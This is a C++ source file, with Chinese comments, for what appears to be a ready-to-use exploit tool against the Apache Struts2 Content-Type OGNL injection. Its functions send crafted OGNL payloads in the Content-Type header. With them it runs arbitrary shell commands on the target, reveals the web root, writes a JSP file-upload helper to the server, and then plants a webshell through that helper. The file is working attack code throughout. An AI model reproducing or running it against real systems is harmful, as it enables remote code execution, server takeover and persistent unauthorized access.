#include "stdafx.h"
#include "Exp.h"
#include <winsock2.h>
#include<atlbase.h>
#include<atlconv.h>
#include <stdio.h>
#include <afxinet.h>

Exp::Exp(void)
{
	jspHelperFileName = "JspHelpComStruts2Xwork2OrgApache.jsp"; //JSP写文件助手 默认文件名

	/* JSP写文件代码 */
	writeJspHelperCode = 
"<%@ page import=\"java.io.*\" %>\
<%\
	request.setCharacterEncoding(\"UTF-8\");\
	String fileData = request.getParameter(\"fd\");\
	String filePath = request.getParameter(\"fp\");\
	if(filePath.indexOf(\"/\") == -1 && filePath.indexOf(\"\\\\\") == -1)\
	{\
		filePath = request.getRealPath(\"/\") + filePath;\
	}\
	try\
	{\
		PrintWriter writer = new PrintWriter(new FileOutputStream(filePath));\
		writer.println(fileData);\
		writer.close();\
		out.print(\"0x00\");\
	}\
	catch(IOException e)\
	{\
		out.println(e.getMessage());\
	}\
%>";
}


Exp::~Exp(void)
{
}

CString Exp::executeCommand(CString url,CString command)
{
	// Content-Type 字段值
	CString contentType = "Content-Type: %{(#dataType='multipart/form-data').(#deafultMemb=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#mA?(#mA=#deafultMemb):((#cner=#context['com.opensymphony.xwork2.ActionContext.container']).(#oU=#cner.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#oU.getExcludedPackageNames().clear()).(#oU.getExcludedClasses().clear()).(#context.setMemberAccess(#deafultMemb)))).(#c='"
		+ command + "').(#osType=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#exeType=(#osType?{'cmd.exe','/c',#c}:{'/bin/bash','-c',#c})).(#thread=new java.lang.ProcessBuilder(#exeType)).(#thread.redirectErrorStream(true)).(#proc=#thread.start()).(#resOut=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#proc.getInputStream(),#resOut)).(#resOut.flush())}";
	//User-Agent 字段值
	CString userAgent = "User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5";
	CString header = contentType + "\n" + userAgent; //HTTP请求头
	CString postData = ""; //POST数据
	DWORD statusCode; //HTTP状态码
	DWORD timeout = 60000; //超时时间 ms
	DWORD retryTime = 1; //重试次数
	DWORD retryDelay = 1000; //重试间隔时间 ms
	CString exeResult = httpPost(url,header,postData,statusCode,timeout,retryTime,retryDelay);
	if(statusCode != 200) //状态码不是200
	{
		CString statusCodeStr;
		statusCodeStr.Format("%d", statusCode); 
		exeResult = "执行失败，HTTP状态码为 " + statusCodeStr;
	}
	return exeResult;
}

CString Exp::getRootPath(CString url,DWORD& statusCode)
{
	// Content-Type 字段值
	CString contentType = "Content-Type: %{(#dataType='multipart/form-data').(#deafultMemb=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#mA?(#mA=#deafultMemb):((#cner=#context['com.opensymphony.xwork2.ActionContext.container']).(#oU=#cner.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#oU.getExcludedPackageNames().clear()).(#oU.getExcludedClasses().clear()).(#context.setMemberAccess(#deafultMemb)))).(#re=@org.apache.struts2.ServletActionContext@getRequest()).(#resW=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#resW.println(#re.getRealPath('/'))).(#resW.close()).(#resOut=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#resOut)).(#resOut.flush())}";
	//User-Agent 字段值
	CString userAgent = "User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5";
	CString header = contentType + "\n" + userAgent; //HTTP请求头
	CString postData = ""; //POST数据
	DWORD timeout = 60000; //超时时间 ms
	DWORD retryTime = 1; //重试次数
	DWORD retryDelay = 1000; //重试间隔时间 ms
	CString pathResult = httpPost(url,header,postData,statusCode,timeout,retryTime,retryDelay);
	if(statusCode != 200) //状态码不是200
	{
		CString statusCodeStr;
		statusCodeStr.Format("%d", statusCode); 
		pathResult = "获取网站根目录失败，HTTP状态码为 " + statusCodeStr;
	}
	return pathResult;
}

CString Exp::writeFile(CString url,CString filePath,CString writeData)
{
	CString writeJspHelperCodeEncode = urlEncode(writeJspHelperCode,CP_ACP,CP_UTF8); //转换成URL编码
	/* 通过OGNL写JSP写文件助手到服务器 */
	//Content-Type字段值
	CString contentType = "Content-Type: %{(#dataType='multipart/form-data').(#deafultMemb=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#mA?(#mA=#deafultMemb):((#cner=#context['com.opensymphony.xwork2.ActionContext.container']).(#oU=#cner.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#oU.getExcludedPackageNames().clear()).(#oU.getExcludedClasses().clear()).(#context.setMemberAccess(#deafultMemb)))).(#wDataBase='" 
		+ writeJspHelperCodeEncode + 
		"').(#re=@org.apache.struts2.ServletActionContext@getRequest()).(#wPath=#re.getRealPath('/')+'"
		+ jspHelperFileName +
		"').(#wData=@java.net.URLDecoder@decode(#wDataBase,'UTF-8')).(#sb=new java.lang.StringBuilder(#wPath)).(#fileOS=new java.io.FileOutputStream(#sb)).(#fileOS.write(#wData.getBytes())).(#fileOS.close()).(#resW=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#resW.println('0x00,'+#re.getContextPath())).(#resW.close()).(#resOut=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#resOut)).(#resOut.flush())}";

	//User-Agent 字段值
	CString userAgent = "User-Agent: Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_3_2 like Mac OS X; en-us) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8H7 Safari/6533.18.5";
	CString header = contentType + "\n" + userAgent; //HTTP请求头
	CString postData = ""; //POST数据
	DWORD statusCode; //HTTP状态码
	DWORD timeout = 60000; //超时时间 ms
	DWORD retryTime = 1; //重试次数
	DWORD retryDelay = 1000; //重试间隔时间 ms
	CString writeResult = httpPost(url,header,postData,statusCode,timeout,retryTime,retryDelay);
	writeResult.Replace("\r",""); //删除回车
	writeResult.Replace("\n",""); //删除换行
	if(statusCode != 200 || writeResult.Mid(0,4) != "0x00") //状态码不是200 并且返回页面前4个字符不是 0x00 则说明OGNL写文件失败
	{
		CString statusCodeStr;
		statusCodeStr.Format("%d", statusCode); 
		writeResult = "写入文件失败，HTTP状态码为 " + statusCodeStr;
		return writeResult;
	}
	/* 通过JSP写文件助手上传文件到服务器 */
	/* URL解析 */
	CString jspHelperPath = writeResult.Mid(5) + "/" + jspHelperFileName; //JSP助手路径
	CString jspHelperURL; //JSP助手完整URL
	CString urlPrefix = "http://"; //URL前缀
	CString urlSeparator = "/"; //URL分隔符
	int urlPrefixPos = url.Find(urlPrefix); //查找第一个前缀位置
	if(urlPrefixPos >= 0) //存在前缀
		url = url.Mid(urlPrefixPos+urlPrefix.GetLength()); //去除前缀
	int urlSeparatorPos = url.Find(urlSeparator); //查找第一个分隔符位置
	if(urlSeparatorPos >= 0) //存在分隔符
		jspHelperURL = url.Mid(0,urlSeparatorPos); //得到网站主机名
	else
		jspHelperURL = url; //得到网站主机名
	jspHelperURL = "http://" + jspHelperURL + jspHelperPath; //JSP助手完整URL
	/* 通过JSP写文件助手上传文件 */
	contentType = "Content-Type: application/x-www-form-urlencoded\n";
	header = contentType + userAgent;
	postData = "fp=" + urlEncode(filePath,CP_ACP,CP_UTF8) + "&fd=" + urlEncode(writeData,CP_ACP,CP_UTF8);
	writeResult = httpPost(jspHelperURL,header,postData,statusCode,timeout,retryTime,retryDelay);
	if(writeResult.Mid(0,4) != "0x00") //并且返回页面前4个字符不是 0x00 则说明JSP助手写文件失败
	{
		CString statusCodeStr;
		statusCodeStr.Format("%d", statusCode); 
		writeResult = "写入文件失败，HTTP状态码为 " + statusCodeStr;
		return writeResult;
	}
	writeResult = "写入文件成功!\n路径: " + filePath;
	return writeResult;
}

CString Exp::getShell(CString url,CString shellName,CString shellData)
{
	CString getshellResult = writeFile(url,shellName,shellData);
	if(getshellResult.Find("成功") != -1) //GETSHELL成功
		getshellResult = "Getshell 成功!\n请访问应用根目录下的Webshell: " + shellName;
	else //失败
		getshellResult = "Getshell 失败!";
	return getshellResult;
}

CString Exp::urlEncode(CString strData,int srcCodepage, int dstCodepage) //URL编码 srcCodepage原类型 dstCodepage转换后的类型 返回小写
{
	CString resultStr = "";
	CString checkTempStr = "";
	BYTE byte;
	CString encodeResult = urlEncodeCore(strData,srcCodepage,dstCodepage);
	for(int i=0;i<encodeResult.GetLength();i++)
	{
		byte = encodeResult.GetAt(i);
		if(byte >= 0 && byte < 128)
			checkTempStr.Format("%%%02x",byte);
		else
		{
			checkTempStr.Format("%%%02x",byte);
			checkTempStr.MakeLower(); //转换为小写
		}
		resultStr += checkTempStr;
	}
	return  resultStr;
}

CString Exp::urlEncodeCore(CString strData, int srcCodepage, int dstCodepage) //URL编码核心实现 srcCodepage原类型 dstCodepage转换后的类型
{
	 int strlen = strData.GetLength();
	 int unicodeLen = MultiByteToWideChar(srcCodepage,0,strData,-1,NULL,0);
	 wchar_t* pUnicode = new wchar_t[unicodeLen+1];  
	 memset(pUnicode,0,(unicodeLen+1)*sizeof(wchar_t));
	 unicodeLen = MultiByteToWideChar(srcCodepage,0,strData,-1,(LPWSTR)pUnicode,unicodeLen);
	 int dstLen = WideCharToMultiByte(dstCodepage,0,(LPWSTR)pUnicode,-1,NULL,0,NULL,NULL); //计算转换后的长度
	 BYTE *pDstData = new BYTE[dstLen+1];
	 memset(pDstData,0,dstLen+1);
	 dstLen = WideCharToMultiByte(dstCodepage,0,(LPWSTR)pUnicode,-1,(char*)pDstData,dstLen,NULL,NULL);
	 CString resultStr;
	 resultStr.Format("%s",pDstData);
	 delete[] pUnicode;
	 delete[] pDstData;
	 return  resultStr;
}

//POST请求，返回请求页面结果,statusCode为返回的HTTP状态码 timeout为超时时间 retryTime重试次数 retryDelay重试间隔时间
CString Exp::httpPost(CString url,CString header,CString postData,DWORD& statusCode,DWORD timeout,DWORD retryTime,DWORD retryDelay)
{
	CString urlHost = ""; //主机
	CString urlPath = ""; //路径
	CString resultPage = ""; //返回页面

	/* URL解析 */
	CString urlPrefix = "http://"; //URL前缀
	CString urlSeparator = "/"; //URL分隔符
	int urlPrefixPos = url.Find(urlPrefix); //查找第一个前缀位置
	if(urlPrefixPos >= 0) //存在前缀
		url = url.Mid(urlPrefixPos+urlPrefix.GetLength()); //去除前缀
	int urlSeparatorPos = url.Find(urlSeparator); //查找第一个分隔符位置
	if(urlSeparatorPos >= 0) //存在分隔符
	{
		urlHost = url.Mid(0,urlSeparatorPos); //取主机名
		urlPath = url.Mid(urlSeparatorPos); //取路径 包括分隔符
	}
	else //不存在分隔符
		urlHost = url; //取主机名
	try
	{
		CInternetSession httpSession;
		httpSession.SetOption(INTERNET_OPTION_CONNECT_TIMEOUT,timeout); //超时时间
		httpSession.SetOption(INTERNET_OPTION_CONNECT_BACKOFF,retryDelay);		// 重试间隔时间	
		httpSession.SetOption(INTERNET_OPTION_CONNECT_RETRIES,retryTime);	//重试次数
		CHttpConnection* HttpConnection = httpSession.GetHttpConnection(urlHost);
		CHttpFile* httpFile = HttpConnection->OpenRequest(CHttpConnection::HTTP_VERB_POST,urlPath,NULL,1,NULL,"HTTP/1.1",INTERNET_FLAG_RELOAD|INTERNET_FLAG_EXISTING_CONNECT|INTERNET_FLAG_NO_CACHE_WRITE);
		httpFile->SendRequest(header,header.GetLength(),(LPVOID)((LPCTSTR)postData),postData.GetLength());
		httpFile->QueryInfoStatusCode(statusCode);
		if(statusCode != 200)
			return resultPage;
		char readBuff[4096]={0};
		int readNum = 0;
		while((readNum = httpFile->Read((void*)readBuff,4095))>0)
		{
			readBuff[readNum] = '\0';
			resultPage += readBuff;
			memset(readBuff,0,4096);
		}
	}
	catch(CInternetException* e)
	{
		e->ReportError();
		statusCode = 0;
	}
	return resultPage;
}